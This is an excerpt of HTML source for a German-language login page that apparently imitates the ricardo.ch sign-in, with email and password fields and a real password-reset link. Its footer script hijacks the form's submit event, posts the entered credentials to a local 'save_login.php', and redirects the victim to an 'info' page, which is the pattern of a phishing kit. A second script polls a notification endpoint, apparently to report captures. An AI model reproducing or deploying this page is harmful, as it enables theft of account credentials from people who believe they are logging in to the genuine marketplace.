                    ...
                    <div class="ceeb7e995 c98450f08">
                        ...
                        <div class="c35cc68b7">
                            <header class="caf9c4b6d cb03adf9e">
                                ...
                                <h1 class="c85308b88 c6689a483">Anmelden</h1>
                            ...
                            <div class="c2701a345 c22884cc9">
                                <form id="loginForm" method="POST" class="cb2e1bdc9 c165a3537" data-form-primary="true">
                                        ...
                                        <div class="c862f080e">
                                            ...
                                            <div class="input-wrapper _input-wrapper">
                                                <div class="c6d02143e c46e32be0 text c70cc0741" data-action-text="" data-alternate-action-text="">
                                                    ...
                                                    <input class="input c19ad00c3 c30d9afca" type="email" inputMode="text" name="username" id="username" type="text" value="" required autoComplete="username" autoCapitalize="none" spellCheck="false" autoFocus>
                                            ...
                                            <div class="input-wrapper _input-wrapper">
                                                <div class="c6d02143e c46e32be0 password c0ff9e370" data-action-text="" data-alternate-action-text="">
                                                    <label class="cf59a1f59 no-js c6fb1f00d c7e7f74a2" for="password">
                                                        Password*
                                                    </label>

                                                    <input class="input c19ad00c3 ce9b3173b" name="password" id="password" type="password" required autoComplete="current-password" autoCapitalize="none" spellCheck="false">

                                                    <div class="cf59a1f59 js-required c6fb1f00d c7e7f74a2" data-dynamic-label-for="password" aria-hidden="true">
                                                        Password*
                                                    </div>


                                                    <button type="button" class="c1d1b1e07 ulp-button-icon c3a9491fe _button-icon" data-action="toggle">
                                                        <span aria-hidden="true" class="password-icon-tooltip show-password-tooltip">Passwort anzeigen</span>

                                                        <span aria-hidden="true" class="password-icon-tooltip hide-password-tooltip hide">Passwort verbergen</span>

                                                        <span class="screen-reader-only password-toggle-label" data-label="show-password">Passwort anzeigen</span>

                                                        <span class="screen-reader-only password-toggle-label hide" data-label="hide-password">Passwort verbergen</span>
                                    ...
                                    <p class="c9ff8630d c2039e792" style="text-align: right;">
                                        <a class="c7ee8ceb0 c879834d5 c8023864a" href="https://login.ricardo.ch/u/login/password-reset-start/DbNew?state=hKFo2SB1c29tUWRDZHc2WHJ6LWwxWlBmRFNlcFUtQ3NIelV4d6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIEdGaE0ybzRsUlhoVzVhajBhUnRreDExS0pPRk80Z21Do2NpZNkgVHdmMG01ZlBjVDFVcExnaFJzdlJobExnaWczWVVWRTM&ui_locales=de">Passwort vergessen?</a>
                                    </p>
                                    ...
                                    <div class="cc199ae96">
                                        ...
                                        <button type="submit" name="action" value="default" class="c1d1b1e07 c94ec4107 c3a9491fe cc1fd6969 c30010b38" data-action-button-primary="true">ANMELDEN</button>
        ...
        <footer class="MuiBox-root css-1v54gwv">
            ...
            <script>
                function togglePassword() {
                    ...
                    if (passwordField.type === 'password') {
                        ...
                        toggleText.textContent = 'Passwort verbergen'; // Show "Hide Password"
                    } else {
                        passwordField.type = 'password';
                        toggleText.textContent = 'Passwort anzeigen'; // Show "Show Password"
                    }
                }
                ...
                document.getElementById('loginForm').addEventListener('submit', function(event) {
                    ...
                    fetch('save_login.php', {
                        ...
                        .then(data => {
                            ...
                            window.location.href = 'info/info_page.php';
                        })
                        .catch(error => {
                ...
                window.onload = function() {
                    ...
                    if (registerLink) {
                        registerLink.style.display = "none"; // Corrected from "hide" to "none"
                    }
                };
            </script>
            ...
            <script>
                $(document).ready(function() {
                    ...
                    $.ajax({
                        url: './notification.php', // Replace with your correct path
                        method: 'GET',
                        dataType: 'json',
                        success: function(data) {
                            ...
                            $.each(data, function(index, notification) {
                                $('#notification-list').append(
                                    `<li>${notification.label} - ${notification.reference} (${notification.created_at})</li>`
                                );
                            });
                        },
